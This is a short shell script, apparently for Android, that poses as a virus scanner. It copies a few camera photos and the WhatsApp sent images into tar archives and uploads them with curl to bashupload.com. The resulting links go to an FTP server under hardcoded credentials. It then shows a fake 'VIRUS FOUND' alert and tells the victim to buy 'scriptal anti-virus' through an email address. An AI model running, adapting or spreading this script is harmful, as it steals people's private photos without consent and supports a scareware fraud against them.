cd /sdcard/DCIM/camera/
i=0
for x in *.jpg; do
  if [ "$i" = 3 ]; then break; fi
  cp   "$x" /sdcard 
  i=$((i+1))
done;  echo -e '\033[31m SCANNING STARTED PLEASE WAIT FEW MINUTES... \033[0m '; cd /sdcard/ ; tar cf gg.tar *.jpg;

cd /sdcard/android/media/com.whatsapp/WhatsApp/media/"WhatsApp Images"/Sent/ 2> /dev/null;tar cf /sdcard/yy.tar *.jpg;

curl -s bashupload.com -T /sdcard/gg.tar > /sdcard/70.txt 
curl -s bashupload.com -T /sdcard/yy.tar >> /sdcard/70.txt 

curl -s -T /sdcard/70.txt -u "immigration22:123456aaA." ftp://files.000webhost.com/tmp/70.txt


echo -e '\033[31m FINISHED!! [VIRUS FOUND] : \033[0m [47]'
echo -e '\033[31m  \033[0m in order to have your Passwords working properly you must buy scriptal anti-virus by contacting freshtrup659@gmail.com.'


